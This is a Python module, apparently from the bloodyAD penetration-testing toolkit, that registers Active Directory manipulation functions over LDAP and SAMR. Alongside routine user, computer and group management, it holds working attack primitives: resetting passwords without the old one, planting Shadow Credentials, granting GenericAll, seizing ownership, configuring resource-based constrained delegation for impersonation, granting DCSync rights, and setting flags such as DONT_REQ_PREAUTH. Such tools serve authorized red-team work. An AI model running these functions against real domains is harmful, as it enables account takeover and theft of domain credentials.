import ldap3
import types
import re
import json
from .addcomputer import ADDCOMPUTER
from functools import wraps

from ldap3.extend.microsoft import addMembersToGroups, modifyPassword, removeMembersFromGroups
from impacket.dcerpc.v5 import dtypes

from .exceptions import BloodyError, ResultError, NoResultError
from .utils import resolvDN, getDefaultNamingContext
from .utils import rpcChangePassword
from .utils import modifySecDesc
from .utils import addShadowCredentials, delShadowCredentials
from .utils import LOG


functions = []


def register_module(f):
    functions.append((f.__name__, f))

    @wraps(f)
    def wrapper(*args, **kwds):
        return f(*args, **kwds)

    return wrapper


@register_module
def getObjectAttributes(conn, identity, attr='*', fetchSD="False"):
    """
    Fetch LDAP attributes for the identity (group or user) provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
        attr: attributes to fetch separated with ',' (default fetch all attributes)
        fetchSD: True fetch nTSecurityDescriptor that contains DACL (default is False)
    """
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    control_flag = 0
    if fetchSD == "True":
        # If SACL is asked the server will not return the nTSecurityDescriptor for a standard user because it needs privileges
        control_flag = dtypes.OWNER_SECURITY_INFORMATION + dtypes.GROUP_SECURITY_INFORMATION + dtypes.DACL_SECURITY_INFORMATION
    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=control_flag)
    ldap_conn.search(dn, "(objectClass=*)", search_scope=ldap3.BASE, attributes=attr.split(','), controls=controls)
    LOG.info(ldap_conn.response_to_json())
    return ldap_conn.response[0]


@register_module
def setAttribute(conn, identity, attribute, value):
    """
    Add or replace an attribute of an object
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object
        attribute: Name of the attribute 
        value: jSON array (e.g ["john.doe"])
    """
    value = json.loads(value)
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    ldap_conn.modify(dn, {attribute: [ldap3.MODIFY_REPLACE, value]})


@register_module
def addUser(conn, sAMAccountName, password, ou=None):
    """
    Add a new user in the LDAP database
    By default the user object is put in the OU Users
    This can be changed with the ou parameter
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
        password: the password that will be set for the user account
    """
    ldap_conn = conn.getLdapConnection()

    if ou:
        user_dn = f"cn={sAMAccountName},{ou}"
    else:
        naming_context = getDefaultNamingContext(ldap_conn)
        user_dn = f"cn={sAMAccountName},cn=Users,{naming_context}"

    user_cls = ['top', 'person', 'organizationalPerson', 'user']
    attr = {'objectClass': user_cls}
    attr["distinguishedName"] = user_dn
    attr["sAMAccountName"] = sAMAccountName
    attr["userAccountControl"] = 544

    ldap_conn.add(user_dn, attributes=attr)

    if ldap_conn.result['description'] == 'success':
        changePassword(conn, sAMAccountName, password)
    else:
        LOG.error(sAMAccountName + ': ' + ldap_conn.result['description'])
        raise BloodyError(ldap_conn.result['description'])


@register_module
def addComputer(conn, hostname, password, ou=None):
    """
    Add a new computer in the AD database
    By default the computer object is put in the OU CN=Computers
    This can be changed with the ou parameter
    Args:
        hostname: computer name (without the trailing $ symbol)
        password: the password that will be set for the computer account
        ou: Optional parameters - Where to put the computer object in the LDAP directory
    """
    cnf = conn.conf
    if re.search('[a-zA-Z]', cnf.host):
        dc_host = cnf.host
        dc_ip = None
    else:
        dc_host = None
        dc_ip = cnf.host
    options = types.SimpleNamespace(
        hashes=f'{cnf.lmhash}:{cnf.nthash}' if cnf.nthash else None,
        aesKey=None, k=cnf.kerberos, kdc_host=None,
        dc_host=dc_host, dc_ip=dc_ip,
        computer_name=hostname, computer_pass=password,
        method='LDAPS' if cnf.scheme.lower() == 'ldaps' else 'SAMR',
        port=None, domain_netbios=None,
        no_add=None, delete=None, baseDN=None,
        computer_group=ou)
    ADDCOMPUTER(cnf.username, cnf.password, cnf.domain, options).run()


@register_module
def delObject(conn, identity):
    """
    Delete an object (user or group) from the Directory based on the identity provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
    """
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    LOG.debug(f"Trying to remove {dn}")
    ldap_conn.delete(dn)
    LOG.info(f"[+] {dn} has been removed")


@register_module
def changePassword(conn, identity, new_pass):
    """
    Change the target password without knowing the old one using LDAPS or RPC
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        new_pass: new password for the target
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    # If LDAPS is not supported use SAMR
    if conn.conf.scheme == "ldaps":
        modifyPassword.ad_modify_password(ldap_conn, target_dn, new_pass, old_password=None)
        if ldap_conn.result['result'] == 0:
            LOG.info('[+] Password changed successfully!')
        else:
            raise ResultError(ldap_conn.result)
    else:
        # Check if identity is sAMAccountName
        sAMAccountName = identity
        for marker in ["dc=", "s-1", "{"]:
            if marker in identity.lower():
                ldap_filter = '(objectClass=*)'
                ldap_conn.search(target_dn, ldap_filter, search_scope=ldap3.BASE, attributes=['SAMAccountName'])
                try:
                    sAMAccountName = ldap_conn.response[0]['attributes']['sAMAccountName']
                except IndexError:
                    raise NoResultError(target_dn, ldap_filter)
                break

        rpcChangePassword(conn, sAMAccountName, new_pass)


@register_module
def addObjectToGroup(conn, member, group):
    """
    Add an object to a group
        member: sAMAccountName, DN, GUID or SID of the object to add to the group
        group: DN, GUID or SID of the group
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    LOG.debug(f"[+] {member} found at {member_dn}")
    group_dn = resolvDN(ldap_conn, group)
    LOG.debug(f"[+] {group} found at {group_dn}")
    addMembersToGroups.ad_add_members_to_groups(ldap_conn, member_dn, group_dn, raise_error=True)
    LOG.info(f"[+] Adding {member_dn} to {group_dn}")


@register_module
def addForeignObjectToGroup(conn, user_sid, group_dn):
    """
    Add foreign principals (users or groups), coming from a trusted domain, to a group
    Args:
        user_sid: foreign object sid
        group_dn: group DN in which to add the foreign object
    """
    ldap_conn = conn.getLdapConnection()
    # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
    magic_user_dn = f"<SID={user_sid}>"
    addMembersToGroups.ad_add_members_to_groups(ldap_conn, magic_user_dn, group_dn, raise_error=True)


@register_module
def delObjectFromGroup(conn, member, group):
    """
    Remove member from group
    Args:
        member: sAMAccountName, DN, GUID or SID of the object to delete from the group
        group: DN, GUID or SID of the group
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    group_dn = resolvDN(ldap_conn, group)
    removeMembersFromGroups.ad_remove_members_from_groups(ldap_conn, member_dn, group_dn, True, raise_error=True)


@register_module
def getChildObjects(conn, parent_obj, object_type='*'):
    """
    List the child objects of an object
    Args:
        base_obj: DN of the targeted parent object
        object_type: the type of object to fetch (user/computer or * to have them all)
    """
    ldap_conn = conn.getLdapConnection()
    ldap_conn.search(parent_obj, f'(objectClass={object_type})')
    res = [entry['dn'] for entry in ldap_conn.response if entry['type'] == 'searchResEntry']
    for child in res:
        LOG.info(child)
    return res

@register_module
def setShadowCredentials(conn, identity, enable="True", outfilePath=None):
    """
    Add ord delete attribute allowing to authenticate as the user provided using a crafted certificate (Shadow Credentials)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)        
        enable: True to add Shadow Credentials for the user or False to remove it (default is True)
        outfilePath: file path for the generated certificate (default is current path)
    """
    if enable == "True":
        addShadowCredentials(conn, identity, outfilePath)
    else:
        delShadowCredentials(conn, identity)


@register_module
def setGenericAll(conn, identity, target, enable="True"):
    """
    Give permission to an AD object to modify the properties of another object
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object you control
        target:  sAMAccountName, GPO name, DN, GUID or SID
        enable: True to add GenericAll for the user or False to remove it (default is True)
    """
    modifySecDesc(conn=conn, identity=identity, target=target, enable=enable, control_flag=dtypes.DACL_SECURITY_INFORMATION)
    if enable == "True":
        LOG.info(f'[+] {identity} can now write the attributes of {target}')


@register_module
def setOwner(conn, identity, target):
    """
    Set an AD object as the owner of the target object
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object you control
        target: sAMAccountName, DN, GUID or SID of the targeted object (You must have WriteOwner permission on it)
    """
    old_sid = modifySecDesc(conn, identity=identity, target=target, control_flag=dtypes.OWNER_SECURITY_INFORMATION)['OwnerSid'].formatCanonical()
    LOG.info(f'[+] Old owner {old_sid} is now replaced by {identity} on {target}')
    return old_sid


@register_module
def setRbcd(conn, spn, target, enable="True"):
    """
    Set Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
    Args:
        spn: sAMAccountName, DN, GUID or SID of the SPN
        target: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
        enable: True to add Rbcd and False to remove it (default is True)
    """
    modifySecDesc(conn=conn, identity=spn, target=target, ldap_attribute='msDS-AllowedToActOnBehalfOfOtherIdentity', enable=enable)
    LOG.info('[+] Delegation rights modified successfully!')
    if enable == "True":
        LOG.info(f'{spn} can now impersonate users on {target} via S4U2Proxy')


@register_module
def setDCSync(conn, identity, enable='True'):
    """
    Set the right to perform DCSync with the user provided (You must have write permission on the domain LDAP object)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the user
        enable: True to add DCSync and False to remove it (default is True)
    """
    modifySecDesc(conn=conn, identity=identity, target=getDefaultNamingContext(conn.getLdapConnection()),
    ldap_filter='(objectCategory=domain)', enable=enable, control_flag=dtypes.DACL_SECURITY_INFORMATION)
    if enable == 'True':
        LOG.info(f'{identity} can now DCSync')

        
@register_module
def setUserAccountControl(conn, identity, flags, enable="True"):
    """
    Enable or disable the flags for the given user (must have a write permission on the UserAccountControl attribute of the target user)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
        flags: hexadecimal value corresponding to flags to set (e.g for DONT_REQ PREAUTH: 0x400000)
        enable: True to add the flags or False to delete them (default is True)
    """
    enable = enable == "True"
    flags = int(flags,16)
    
    conn = conn.getLdapConnection()
    user_dn = resolvDN(conn, identity)
    conn.search(user_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes='userAccountControl')
    userAccountControl = conn.response[0]['attributes']['userAccountControl']
    LOG.debug(f"Original userAccountControl: {userAccountControl}")

    if enable:
        userAccountControl = userAccountControl | flags
    else:
        userAccountControl = userAccountControl & ~flags

    LOG.debug(f"Updated userAccountControl: {userAccountControl}")
    conn.modify(user_dn, {'userAccountControl': (ldap3.MODIFY_REPLACE, [userAccountControl])})

    if conn.result['result'] == 0:
        LOG.info("Updated userAccountControl attribute successfully")
    else:
        raise ResultError(conn.result)
